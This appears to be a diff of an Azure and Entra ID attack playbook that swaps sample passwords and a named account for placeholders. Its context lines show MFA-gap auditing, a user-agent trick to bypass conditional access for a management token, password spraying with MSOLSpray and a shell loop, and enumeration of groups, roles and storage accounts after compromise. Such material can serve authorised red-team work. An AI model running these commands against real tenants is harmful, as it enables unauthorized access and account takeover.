@@ -325,7 +325,7 @@
   # Step 1: Audit which Azure API surfaces lack MFA enforcement
   python3 findmeaccess.py audit \
     -u 'user@target.com' \
-    -p 'Password123!' \
+    -p 'user_password' \
     -c 'd3590ed6-52b3-4102-aeff-aad2292ab01c'
   # Output: lines prefixed [+] = no MFA required, [-] = MFA/CA blocked
   # Key targets: Azure Management API (ARM), Key Vault, Microsoft Graph
@@ -333,7 +333,7 @@
   # Step 2: If ARM is blocked but other surfaces are open, try UA bypass for ARM token
   python3 findmeaccess.py token \
     -u 'user@target.com' \
-    -p 'Password123!' \
+    -p 'user_password' \
     -c 'd3590ed6-52b3-4102-aeff-aad2292ab01c' \
     -r 'https://management.azure.com' \
     --user_agent "Mozilla/5.0 (PlayStation 5 3.03/SmartTV) AppleWebKit/605.1.15 (KHTML, like Gecko)"
@@ -676,7 +676,7 @@
   Invoke-MFASweep -OutputFile "mfa_status.txt"
   
   # Run credential spray using MSOLSpray
-  Invoke-MSOLSpray -UserList users.txt -Password 'Password123!' -Delay 300
+  Invoke-MSOLSpray -UserList users.txt -Password 'user_password' -Delay 300
   
   # Alternative: Manual spray via Azure CLI
   for user in $(cat users.txt); do
@@ -753,7 +753,7 @@
 - **Payload/Method:**
   ```bash
   # Step 1: Authenticate as compromised user
-  az login -u marcus@megabigtech.com -p 'TheEagles12345!'
+  az login -u user@target.com -p 'user_password'
   
   # Step 2: Enumerate AD groups for compromised user
   USERID=$(az ad user list --query "[?userPrincipalName=='marcus@megabigtech.com'].id" -o tsv)
@@ -761,7 +761,7 @@
   # Look for groups tied to sensitive resources
   
   # Step 3: Check role assignments for the user (both direct and inherited via group)
-  az role assignment list --all --query "[?principalName=='marcus@megabigtech.com' || principalName=='CUSTOMER-DATABASE-ACCESS']" | jq '[.[] | {roleDefinitionName, scope}]'
+  az role assignment list --all --query "[?principalName=='user@target.com' || principalName=='CUSTOMER-DATABASE-ACCESS']" | jq '[.[] | {roleDefinitionName, scope}]'
   
   # Step 4: Identify storage accounts visible to user
   az storage account list | jq -r '.[].name'
